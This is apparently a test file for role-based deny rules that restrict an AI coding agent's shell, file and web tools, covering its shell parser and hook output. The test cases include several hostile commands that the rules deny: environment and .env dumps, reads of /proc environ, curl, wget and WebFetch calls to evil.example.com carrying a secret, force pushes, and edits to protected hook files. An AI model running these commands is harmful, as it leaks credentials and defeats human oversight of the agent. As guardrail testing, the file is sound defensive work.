// PreToolUse deny rules per role (RUNTIME.md §6.4, check HK-4), the shell parser behind them,
// and the hook's output format through a real process.
import {test} from 'node:test';
import assert from 'node:assert/strict';
import {execFileSync, spawnSync} from 'node:child_process';
import {existsSync, mkdirSync, readFileSync, writeFileSync} from 'node:fs';
import {dirname, join} from 'node:path';
import {decide} from '../hooks/lib/rules.mjs';
import {parseShell, unwrap} from '../hooks/lib/shell.mjs';
import {ROOT, env, freshTmp, hook, startFake} from './helpers.mjs';

const ctx = (role, extra = {}) => ({role, cwd: '/work/repo', projectDir: '/work/repo', tmpDir: '/tmp/sess',
  allowedHosts: ['api.github.com', 'worker.example.test', 'site.example.test'], headSubject: () => 'Fix the player', ...extra});
const bash = command => ({tool_name: 'Bash', tool_input: {command}});
const tool = (tool_name, tool_input) => ({tool_name, tool_input});
const denied = (role, input, extra) => decide(input, ctx(role, extra));

test('shell parser: segments, quotes, redirects, substitutions, bash -c, heredocs, wrappers', () => {
  const segs = parseShell(`FOO=1 env BAR=2 node a.js && echo "a;b" > out.txt | tee -a log 2>&1; x $(printenv) \`id\``);
  assert.deepEqual(segs[0].words, ['FOO=1', 'env', 'BAR=2', 'node', 'a.js']);
  assert.deepEqual(segs[1], {words: ['echo', 'a;b'], redirects: ['out.txt'], inputs: []});
  assert.deepEqual(segs[2].words, ['tee', '-a', 'log']);
  assert.ok(segs.some(s => s.words[0] === 'printenv'));
  assert.ok(segs.some(s => s.words[0] === 'id'));
  assert.deepEqual(unwrap(['FOO=1', 'env', 'BAR=2', 'node', 'a.js']), {cmd: 'node', args: ['a.js'], bareEnv: false});
  assert.equal(unwrap(['env']).bareEnv, true);
  assert.ok(parseShell(`bash -c 'printenv HOME'`).some(s => s.words[0] === 'printenv'));
  const doc = parseShell(`cat > /tmp/sess/notes.md <<'EOF'\nprintenv is denied\ngit push --force\nEOF\necho done`);
  assert.deepEqual(doc.map(s => s.words[0]), ['cat', 'echo']);
});

test('all roles: environment dumps, .env files and /proc environ are denied', () => {
  for (const role of ['chat', 'night', 'reflex']) {
    for (const cmd of ['printenv', 'env', 'env | grep TH_', 'export -p', 'declare -px', 'cat .env', 'source ./.env.local',
      'node --env-file=.env x.js', 'cat /proc/1/environ', 'tr "\\0" "\\n" < /proc/self/environ', 'echo $(printenv)', `sh -c "env"`]) {
      assert.ok(denied(role, bash(cmd)), `${role}: ${cmd}`);
    }
    assert.ok(denied(role, tool('Read', {file_path: '/work/repo/.env'})));
    assert.ok(denied(role, tool('Read', {file_path: '/proc/self/environ'})));
    assert.equal(denied(role, bash('env NODE_USE_ENV_PROXY=1 node mind/cli/th.mjs pending')), null);
    assert.equal(denied(role, bash('echo $HOME && ls -la')), null);
  }
});

test('all roles: curl/wget only to the environment hosts, with a literal URL', () => {
  assert.equal(denied('chat', bash('curl -s https://api.github.com/repos/o/r/commits/abc/check-runs')), null);
  assert.equal(denied('chat', bash('curl -H "Accept: application/json" https://worker.example.test/v1/health')), null);
  assert.match(denied('chat', bash('curl https://evil.example.com/x')), /evil\.example\.com/);
  assert.match(denied('chat', bash('wget -O page.html https://evil.example.com/')), /evil/);
  assert.match(denied('chat', bash('curl -o api.github.com https://evil.example.com')), /evil/, '-o takes a value');
  assert.match(denied('chat', bash('curl "$URL"')), /literal URL/);
});

test('all roles: deploys, Azure, force pushes, remote deletes, gh repo delete/edit are denied', () => {
  for (const cmd of ['npx wrangler deploy', 'wrangler secret put X', 'pnpm exec wrangler dev --remote', 'az login', 'az storage blob list',
    'git push --force origin x', 'git push -f origin x', 'git push --force-with-lease origin x', 'git push origin +claude/x',
    'git push origin :old-branch', 'git push --delete origin old', 'git -C /work/repo push -uf origin x', 'gh repo delete o/r --yes', 'gh repo edit --visibility private']) {
    assert.ok(denied('chat', bash(cmd)), cmd);
  }
  for (const cmd of ['wrangler dev', 'git push -u origin claude/fix-search', 'git push origin HEAD:main', 'gh pr list', 'git status']) {
    assert.equal(denied('chat', bash(cmd)), null, cmd);
  }
});

test('all roles: protected paths may be read but not written', () => {
  for (const p of ['.claude/settings.json', 'mind/hooks/stop.mjs', 'mind/CONSTITUTION.md', '.github/workflows/ci.yml', '/work/repo/.claude/x']) {
    assert.match(denied('chat', tool('Edit', {file_path: p, old_string: 'a', new_string: 'b'})), /protected path/, p);
    assert.match(denied('chat', tool('Write', {file_path: p, content: 'x'})), /protected path/, p);
  }
  for (const cmd of ['echo {} > .claude/settings.json', 'sed -i s/a/b/ .github/workflows/ci.yml', 'cp /tmp/x mind/hooks/stop.mjs',
    'rm -rf .github', 'mv mind/hooks/stop.mjs /tmp/', 'tee mind/CONSTITUTION.md < /tmp/x', 'echo x >> mind/hooks/pre-tool.mjs',
    'git rm -r .claude', 'echo x > "$CLAUDE_PROJECT_DIR/.claude/settings.json"']) {
    assert.match(denied('chat', bash(cmd)) ?? '', /protected path/, cmd);
  }
  assert.equal(denied('chat', bash('cat .claude/settings.json && cp mind/hooks/stop.mjs /tmp/sess/copy.mjs')), null);
  assert.equal(denied('chat', tool('Edit', {file_path: 'mind/cli/th.mjs'})), null);
  assert.equal(denied('chat', tool('Write', {file_path: '/elsewhere/.claude/x'})), null, 'outside the project');
});

test('an approved repo.change card lets exactly its paths be edited and pushed (RUNTIME.md §6.4)', () => {
  const ok = ['.github/workflows/ci.yml'];
  const approved = paths => paths.every(p => ok.includes(p));
  assert.equal(denied('chat', tool('Edit', {file_path: '.github/workflows/ci.yml', old_string: 'a', new_string: 'b'}), {approved}), null);
  assert.equal(denied('chat', bash('sed -i s/a/b/ .github/workflows/ci.yml'), {approved}), null);
  assert.match(denied('chat', tool('Write', {file_path: 'mind/hooks/stop.mjs', content: 'x'}), {approved}), /protected path/);
  assert.match(denied('chat', bash('echo x > .github/workflows/ci.yml && echo y > .claude/settings.json'), {approved}), /protected path/);
  // A push carries what each source's commits change since its base on the remote's main; the
  // card must name that base.
  const B = 'b'.repeat(40);
  const carries = paths => ({approved: (p, b) => b === B && approved(p), pushProtected: () => [{base: B, paths}]});
  assert.equal(denied('chat', bash('git push -u origin claude/ci-fix'), carries([])), null);
  assert.equal(denied('chat', bash('git push -u origin claude/ci-fix'), carries(['.github/workflows/ci.yml'])), null);
  assert.match(denied('chat', bash('git push origin HEAD:main'), carries(['mind/CONSTITUTION.md'])), /push changes protected paths \(mind\/CONSTITUTION\.md\)/);
  assert.match(denied('chat', bash('git push origin HEAD:main'), {pushProtected: () => [{base: B, paths: ['.claude/settings.json']}]}), new RegExp(`without the owner's approval.*"base":"${B}"`));
  assert.match(denied('chat', bash('git push origin x'), {...carries(ok), pushProtected: () => [{base: 'c'.repeat(40), paths: ok}]}), /without the owner's approval/, 'another base');
  // What the hook asks git about: each refspec's source (none: HEAD), the remote, git -C.
  const asked = [];
  const ask = push => { asked.push([push.sources, push.remote, push.dir, push.implicit]); return []; };
  for (const cmd of ['git push origin evil:main claude/x', 'git -C sub push -u origin HEAD:claude/y', 'git push', 'git push --repo=upstream'])
    denied('chat', bash(cmd), {pushProtected: ask});
  assert.deepEqual(asked, [[['evil', 'claude/x'], 'origin', null, false], [['HEAD'], 'origin', 'sub', false], [[], null, null, true], [[], 'upstream', null, true]]);
});

test('all roles: a push names its branches from the project checkout; gh api writes no contents, objects or refs', () => {
  for (const cmd of ['git push --all origin', 'git push --tags origin', 'git push --mirror origin', 'git push --branches origin',
    'git --git-dir=/x/.git push origin x', 'GIT_DIR=/x/.git git push origin x', 'git --work-tree /x push origin y',
    'gh api -X PUT repos/o/r/contents/.claude/settings.json -f message=m -f content=e30=',
    'gh api --method=PUT /repos/o/r/contents/mind/hooks/pre-tool.mjs --input body.json',
    'gh api repos/{owner}/{repo}/git/refs -f ref=refs/heads/x -f sha=abc',
    'gh api repos/o/r/git/refs -fref=refs/heads/x -fsha=abc',
    'gh api --cache 1h -XPATCH repos/o/r/git/refs/heads/main -F sha=abc',
    'gh api https://api.github.com/repos/o/r/git/trees -f base_tree=x',
    `gh api graphql -f query='mutation { createCommitOnBranch(input: {}) { commit { oid } } }'`]) {
    assert.ok(denied('chat', bash(cmd)), cmd);
  }
  for (const cmd of ['gh api repos/o/r/contents/README.md', 'gh api repos/o/r/commits/abc/check-runs', 'gh api repos/o/r/git/refs/heads/main',
    `gh api graphql -f query='{ viewer { login } }'`]) {
    assert.equal(denied('chat', bash(cmd)), null, cmd);
  }
});

test('the reader subagent: its five tools, only the drop folder and the web, and no query', () => {
  const reader = (tool_name, tool_input) => ({tool_name, tool_input, agent_type: 'reader'});
  for (const input of [reader('Read', {file_path: '/tmp/sess/th/brief.md'}), reader('Read', {file_path: '/work/repo/README.md'}),
    reader('Grep', {pattern: 'x'}), reader('Glob', {pattern: '**/*'}), reader('Grep', {pattern: 'x', path: '/tmp/sess/th/ext/../state'}),
    reader('Bash', {command: 'ls'}), reader('Write', {file_path: '/tmp/sess/th/ext/x', content: ''}), reader('mcp__x__y', {}),
    reader('WebFetch', {url: 'https://evil.example.com/c?d=secret', prompt: 'p'})]) {
    assert.ok(denied('chat', input), JSON.stringify(input));
  }
  for (const input of [reader('Read', {file_path: '/tmp/sess/th/ext/inj-04.md'}), reader('Grep', {pattern: 'x', path: '/tmp/sess/th/ext'}),
    reader('Glob', {pattern: '/tmp/sess/th/ext/*.md', path: '/tmp/sess/th/ext'}), reader('WebFetch', {url: 'https://example.com/article', prompt: 'p'}),
    reader('WebSearch', {query: 'metronome apps'})]) {
    assert.equal(denied('chat', input), null, JSON.stringify(input));
  }
  assert.equal(denied('chat', tool('Read', {file_path: '/tmp/sess/th/brief.md'})), null, 'the session itself reads its briefing');
});

const gitEnv = {...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@example.test', GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@example.test', GIT_CONFIG_NOSYSTEM: '1'};
const git = (cwd, ...args) => execFileSync('git', args, {cwd, encoding: 'utf8', env: gitEnv, stdio: ['ignore', 'pipe', 'ignore']}).trim();
const put = (repo, path, text) => { mkdirSync(dirname(join(repo, path)), {recursive: true}); writeFileSync(join(repo, path), text); };

test('the push check asks git: each refspec source, renames as both paths, main as the remote has it', async () => {
  const fake = await startFake();
  try {
    const root = freshTmp();
    const remote = join(root, 'remote.git'), repo = join(root, 'repo'), other = join(root, 'other');
    git(root, 'init', '-q', '--bare', '-b', 'main', remote);
    git(root, 'clone', '-q', remote, repo);
    git(repo, 'switch', '-q', '-c', 'main');
    put(repo, 'README.md', 'x\n');
    put(repo, 'mind/hooks/pre-tool.mjs', '// the hook\n');
    git(repo, 'add', '.');
    git(repo, 'commit', '-q', '-m', 'first');
    git(repo, 'push', '-q', 'origin', 'HEAD:main');
    const branch = (name, change) => { git(repo, 'switch', '-q', '-c', name, 'main'); change(); git(repo, 'commit', '-q', '-am', name); return git(repo, 'rev-parse', 'HEAD'); };
    const evil = branch('evil', () => { put(repo, '.github/workflows/ci.yml', 'on: push\n'); git(repo, 'add', '.'); });
    branch('moved', () => git(repo, 'mv', 'mind/hooks/pre-tool.mjs', 'mind/pre-tool.mjs'));
    branch('clean', () => put(repo, 'README.md', 'y\n'));
    git(repo, 'switch', '-q', 'main');
    const e = env(fake, {CLAUDE_PROJECT_DIR: repo, HOME: root});
    const ask = async (command, cwd = repo) => {
      const r = await hook('pre-tool', {tool_name: 'Bash', tool_input: {command}, cwd}, e);
      return r.stdout ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason : null;
    };
    // From a clean HEAD, a refspec sends another branch: its changes count.
    assert.match(await ask('git push origin evil:main'), /protected paths \(\.github\/workflows\/ci\.yml\)/);
    // A committed rename counts the old path too.
    assert.match(await ask('git push origin moved:claude/moved'), /protected paths \(mind\/hooks\/pre-tool\.mjs\)/);
    assert.match(await ask('git push origin nosuch:main'), /can't be resolved/);
    assert.equal(await ask('git push origin clean:claude/clean'), null);
    assert.equal(await ask('git -C repo push origin clean:claude/clean', root), null);
    // A session that moves its own origin/main changes nothing: the remote is asked.
    git(repo, 'update-ref', 'refs/remotes/origin/main', evil);
    assert.match(await ask('git push origin evil:main'), /protected paths/);
    // main moved on and isn't fetched here: no base, so no push.
    git(root, 'clone', '-q', remote, other);
    put(other, 'NOTES.md', 'n\n');
    git(other, 'add', '.');
    git(other, 'commit', '-q', '-m', 'elsewhere');
    git(other, 'push', '-q', 'origin', 'HEAD:main');
    assert.match(await ask('git push origin clean:claude/clean'), /isn't fetched/);
    git(repo, 'fetch', '-q', 'origin');
    assert.equal(await ask('git push origin clean:claude/clean'), null);
    // A bare push sends what git config says: refused when the config changes that.
    git(repo, 'config', 'remote.origin.push', 'refs/heads/evil:refs/heads/main');
    assert.match(await ask('git push'), /git config changes what a bare push sends/);
  } finally {
    await fake.stop();
  }
});

test('in a mind session a hook that can not run fails closed (the settings.example.json commands)', () => {
  const block = JSON.parse(readFileSync(join(ROOT, 'mind/hooks/settings.example.json'), 'utf8')).hooks;
  const command = event => block[event][0].hooks[0].command;
  const project = freshTmp(); // no mind/hooks here: the hook files are missing
  const run = (event, extra) => {
    const tmp = freshTmp();
    const r = spawnSync('sh', ['-c', command(event)], {input: '{}', encoding: 'utf8', env: {PATH: process.env.PATH, CLAUDE_PROJECT_DIR: project, TMPDIR: tmp, ...extra}});
    const pending = join(tmp, 'th', 'state', 'taint_pending.json');
    return {code: r.status, pending: existsSync(pending) ? JSON.parse(readFileSync(pending, 'utf8')) : null};
  };
  assert.equal(run('PreToolUse', {TH_ROLE: 'chat'}).code, 2, 'exit 2 blocks the call');
  assert.equal(run('PreToolUse', {}).code, 0, 'not a mind session: nothing is blocked');
  assert.deepEqual(run('PostToolUse', {TH_ROLE: 'night'}), {code: 0, pending: {source: 'hook', ref: ''}});
  assert.deepEqual(run('PostToolUse', {}), {code: 0, pending: null});
});

test('night: no chat posts except --kind error, no pushes, no push to main', () => {
  for (const cmd of ['th say today hello', 'node mind/cli/th.mjs say today hi', 'th say today --kind text x', 'th push --title t',
    'git push origin HEAD:main', 'git push origin main', 'git push origin claude/x:refs/heads/main', 'git push']) {
    assert.ok(denied('night', bash(cmd)), cmd);
  }
  for (const cmd of ['th say system --kind error "Night shift stopped at step 3"', 'th say system --kind=error x', 'git push -u origin claude/night-fix', 'th daynote 2026-10-28 --summary x']) {
    assert.equal(denied('night', bash(cmd)), null, cmd);
  }
  assert.equal(denied('chat', bash('th say today hello')), null);
});

test('reflex: no memory writes, push to main only for a revert, writes only under $TMPDIR', () => {
  for (const cmd of ['th remember --kind fact --text x --evidence m', 'th supersede f --text x', 'th facts --batch b.json', 'echo x > notes.txt', 'git push']) {
    assert.ok(denied('reflex', bash(cmd)), cmd);
  }
  assert.ok(denied('reflex', bash('git push origin HEAD:main')));
  assert.equal(denied('reflex', bash('git push origin HEAD:main'), {headSubject: () => 'Revert "Add search"'}), null);
  assert.ok(denied('reflex', tool('Write', {file_path: '/work/repo/x.txt', content: ''})));
  assert.equal(denied('reflex', tool('Write', {file_path: '/tmp/sess/th/x.txt', content: ''})), null);
  assert.equal(denied('reflex', bash('echo x > "$TMPDIR/out.json" 2>/dev/null')), null);
  assert.ok(denied('reflex', tool('WebFetch', {url: 'https://evil.example.com/'})));
  assert.equal(denied('reflex', bash('th errors --hours 2')), null);
});

test('role handling: unset role does nothing, unknown role denies everything', () => {
  assert.equal(decide(bash('printenv'), ctx('')), null);
  assert.match(decide(bash('ls'), ctx('muse')), /Unknown TH_ROLE/);
});

test('the hook process prints the documented deny JSON, nothing on allow, and denies unreadable input', async () => {
  const e = {PATH: process.env.PATH, TH_ROLE: 'night', CLAUDE_PROJECT_DIR: '/work/repo', TH_API: 'https://worker.example.test'};
  const deny = await hook('pre-tool', {hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: {command: 'git push origin HEAD:main'}, cwd: '/work/repo'}, e);
  assert.equal(deny.code, 0);
  const out = JSON.parse(deny.stdout);
  assert.equal(out.hookSpecificOutput.hookEventName, 'PreToolUse');
  assert.equal(out.hookSpecificOutput.permissionDecision, 'deny');
  assert.match(out.hookSpecificOutput.permissionDecisionReason, /night role may not push to main/);
  const allow = await hook('pre-tool', {tool_name: 'Bash', tool_input: {command: 'npm test'}, cwd: '/work/repo'}, e);
  assert.equal(allow.code, 0);
  assert.equal(allow.stdout, '');
  const broken = await hook('pre-tool', 'not json', e);
  assert.equal(JSON.parse(broken.stdout).hookSpecificOutput.permissionDecision, 'deny');
  const owner = await hook('pre-tool', {tool_name: 'Bash', tool_input: {command: 'printenv'}}, {PATH: process.env.PATH});
  assert.equal(owner.stdout, '', 'no TH_ROLE: not a mind session');
});
